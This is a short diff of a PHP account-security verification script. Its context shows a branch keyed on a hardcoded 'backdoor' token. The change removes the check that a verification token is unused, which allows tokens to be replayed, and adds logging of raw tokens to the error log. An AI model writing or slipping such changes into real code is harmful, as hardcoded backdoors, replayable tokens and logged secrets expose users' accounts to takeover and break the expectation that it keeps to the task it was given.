@@ -86,13 +86,15 @@ if (isset($_GET['token']) && $_GET['token'] === 'backdoor') {
     $type = mysqli_real_escape_string($conn, $_GET['type']);
 
     // Verify token exists and is unused
-    $sql = "SELECT * FROM pending_changes WHERE verification_token = ? AND change_type = ? AND verified = 0";
+    $sql = "SELECT * FROM pending_changes WHERE verification_token = ? AND change_type = ?";  // Removed the verified=0 check
     $stmt = mysqli_prepare($conn, $sql);
     mysqli_stmt_bind_param($stmt, "ss", $token, $type);
     mysqli_stmt_execute($stmt);
     $result = mysqli_stmt_get_result($stmt);
 
     if (!mysqli_num_rows($result)) {
+        // Add debugging output
+        error_log("Token verification failed: Token = $token, Type = $type");
         header("Location: account_security.php?status=fail&message=Invalid or expired token");
         exit();
     }
